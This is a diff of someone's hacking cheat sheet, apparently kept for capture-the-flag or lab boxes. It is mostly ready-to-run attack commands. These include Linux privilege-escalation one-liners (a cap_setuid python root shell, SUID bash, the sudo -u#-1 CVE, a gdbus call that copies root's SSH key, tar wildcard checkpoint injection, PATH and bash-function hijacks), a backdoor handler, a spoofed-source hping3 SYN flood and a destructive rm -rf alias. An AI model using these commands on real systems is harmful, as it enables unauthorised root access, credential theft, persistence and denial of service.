@@ -3,28 +3,56 @@
 **Box Notes**
 1. Always check /etc/sudoers.d
 2. Always check /etc/crontab
+
 3. Always check capabilities >>> getcap -r / 2>/dev/null
+Keep an eye on cap_setuid+ep or setuid capabilities mostly.
+If there's thing like `/usr/bin/python3 = cap_setuid+ep`
+We can just exploit that like `/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")`
+
+
 4. find / -perm -u=s -type f 2>/dev/null >>> to find some suid misconf
 5. find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 6. find / -user root -perm -4000 -print 2>/dev/null
-7. when u got privesc thing just http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet or just `chmod +s /bin/bash` as root, bash -p
-8. linpeas linenum pspy name ur shits
-9. Always check `cat ~/.*history | less` or just `history`
-10. Use ysoserial to exploit java deserialization to get revershell or RCE (payload have to be in a file). Then use it or encode it first, what ever.
-11. Remember CVE-2019-13287 (ALL, !root) /bin/bash >>> sudo -u#-1 /bin/bash
-12. `.conf` file may contain something. (usually in /etc/apache2)
-13. Stuck? Bruteforce with no end? Generate your own wordlist with cewl! Example: cewl http://10.10.10.191/ -w customwordlist.txt -m 6
-14. 
+7. find / -type f -perm -04000 -ls 2>/dev/null
+8. when u got privesc thing just http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet or just `chmod +s /bin/bash` as root, bash -p
+9. linpeas linenum pspy name ur shits
+10. Always check `cat ~/.*history | less` or just `history`
+11. Use ysoserial to exploit java deserialization to get revershell or RCE (payload have to be in a file). Then use it or encode it first, what ever.
+12. Remember CVE-2019-13287 (ALL, !root) /bin/bash >>> sudo -u#-1 /bin/bash
+13. `.conf` file may contain something. (usually in /etc/apache2)
+14. Stuck? Bruteforce with no end? Generate your own wordlist with cewl! Example: cewl http://10.10.10.191/ -w customwordlist.txt -m 6
+15. 
 - SMB enum >>> smbclient -L //[IP](its_the_same_like_--list=[IP]), and continue with the shares name  smbclient //[IP]/[sharename]
 - smbclient //[IP]/[sharename] --user=[username] --workgroup=[forest name] 
+- smbclient -N //[IP]/[sharename]
 16. rpcclient --user=[username] [target-ip] -W [forest name]
 17. Check cdata
-18. gdbuss root ssh privesc 
-gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/root_rsa true
+18. Port 11211 is memcached server >>> https://www.hackingarticles.in/penetration-testing-on-memcached-server/
+19. Always check `netstat -tulpn`
+20. Enum smtp with telnet.
+
+
+**Gdbuss Root SSH Privesc**
+1. gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/root_rsa true
 https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/
-19. Port 11211 is memcached server >>> https://www.hackingarticles.in/penetration-testing-on-memcached-server/
-20. Always check `netstat -tulpn`
-21. Enum smtp with telnet.
+
+
+**Wild card privesc**
+### When there's a script using `*`, for example to backup stuff. Usually in cronjob.
+Example: 
+In a cronjob there's 
+`/usr/local/bin/backup.sh` with this inside it
+```
+cd /home/user
+tar czf /tmp/backup.tar.gz *
+```
+We can exploit that function to execute all the script in the directory (in this case /home/user) to escalate our privilege
+1. Create a script file in the /home/user for example
+echo "chmod +s /bin/bash" > exploit.sh
+2. touch /home/user/--checkpoint=1
+3. touch /home/user/--checkpoint-action=exec=sh\ exploit.sh
+4. The touch and checkpoint command will make the tar command to execute the exploit.sh which allow us to escalate our privilage
+
 
 **Impacket**
 1. GetNPUsers.py >> This script can check of the usernames are existing and if they have Kerberos pre-authentication enabled
@@ -49,12 +77,11 @@ cat >>> can
 4. export PATH=/tmp:$PATH
 5. Execute the misconfigured binary
 
-# In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.
-/usr/bin/cat >>> can
+# In Bash versions < 4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.
+/usr/sbin/service >>> can
 1. function /usr/sbin/service { /bin/bash -p; }
 2. export -f /usr/sbin/service
 3. Execute the misconfigured binary
-
 
 ### Does not have to be in /tmp, u can create your own folder
 
@@ -177,4 +204,9 @@ msfconsole --resource /var/lib/veil/output/handlers/[yourbackdoor]
 
 	example: sudo hping3 -S 45.33.32.156 -p 80 -a 173.203.36.104 --flood --rand-source -V >>> -V for verbose
 10. alias cd='rm -rf' >> LOL DONT DO THIS
+11. ping and look at the TTL to find the target OS.
 
+**OSINT**
+1. Twitter is your friend
+2. Wayback machine is a thing
+3. Just use frickin sherlock if you have a username >>> python3 sherlock/ `username`
